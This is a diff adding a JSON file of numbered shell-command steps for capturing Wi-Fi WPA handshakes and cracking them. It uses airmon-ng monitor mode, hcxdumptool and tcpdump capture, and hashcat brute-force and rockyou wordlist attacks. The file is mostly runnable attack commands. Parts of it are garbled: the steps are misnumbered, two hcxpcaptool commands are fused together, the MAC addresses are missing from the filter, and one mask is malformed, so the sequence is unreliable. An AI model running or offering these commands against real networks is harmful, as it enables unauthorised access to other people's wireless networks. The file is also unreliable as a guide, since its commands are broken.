@@ -1,0 +1,89 @@
+[
+    {
+        "step": 9,
+        "name": "Scan interfaces",
+        "commands": [
+            "sudo iw dev",
+            "iwconfig",
+            "sudo airmon-ng",
+            "sudo airmon-ng check kill"
+        ]
+    },
+    {
+        "step": 2,
+        "name": "Stop managing service",
+        "commands": [
+            "sudo systemctl stop NetworkManager.service",
+            "sudo systemctl stop wpa_supplicant.service"
+        ]
+    },
+    {
+        "step": 3,
+        "name": "Put NIC into monitor mode",
+        "commands": [
+            "sudo airmon-ng start wlanX"
+        ]
+    },
+    {
+        "step": 4,
+        "name": "Scan for networks",
+        "commands": [
+            "sudo airodump-ng wlanX"
+        ]
+    },
+    {
+        "step": 5,
+        "name": "Create a BPF filter",
+        "commands": [
+            "sudo tcpdump -s 65535 -y IEEE802_11_RADIO 'wlan addr3  or wlan addr3 ffffffffffff' -ddd > ssid1_attack.bpf"
+        ]
+    },
+    {
+        "step": 6,
+        "name": "Start packet capture",
+        "commands": [
+            "sudo hcxdumptool -i wlanX -c 1a --bpf=ssid1_attack.bpf -w ssid1_capture.pcapng",
+            "sudo tcpdump -U -s 0 -i wlanX -w ssid1_capture.pcap -l -n -e -vv -r ssid1_attack.bpf"
+        ]
+    },
+    {
+        "step": 7,
+        "name": "Convert captured packets to hashcat format",
+        "commands": [
+            "sudo hcxpcaptool -o ssid1_hash.hc22000 ssid1_capture.pcapngsudo hcxpcaptool -z ssid1_hash.16800 ssid1_capture.pcapng"
+        ]
+    },
+    {
+        "step": 8,
+        "name": "Crack captured hashes",
+        "commands": [
+            "hashcat.exe ssid1_hash.hc22000 -a 3 -m 22000 -i --increment-min=8 --increment-max=12 ?d?d?d?d?d?d?d?d?d?d?d?d --session=1",
+            "sudo hashcat -m 22000 ssid1_hash.hc22000 %d%d%d%d%d%d%d%d%d%d -a 3 --force",
+            "sudo hashcat -m 16800 ssid1_hash.16800 /usr/share/wordlists/rockyou.txt"
+        ]
+    },
+    {
+        "step": 1,
+        "name": "Restart managing service",
+        "commands": [
+            "sudo systemctl start NetworkManager.service",
+            "sudo systemctl start wpa_supplicant.service"
+        ]
+    },
+    {
+        "step": 10,
+        "name": "Fix hcxdumptool error",
+        "commands": [
+            "sudo apt-get update",
+            "sudo apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev",
+            "git clone https://github.com/ZerBea/hcxtools.git",
+            "cd hcxtools",
+            "sudo make && sudo make install",
+            "cd ..",
+            "git clone https://github.com/Zerbea/hcxdumptool.git",
+            "cd hcxdumptool",
+            "sudo make && sudo make install",
+            "which hcxdumptool"
+        ]
+    }
+]
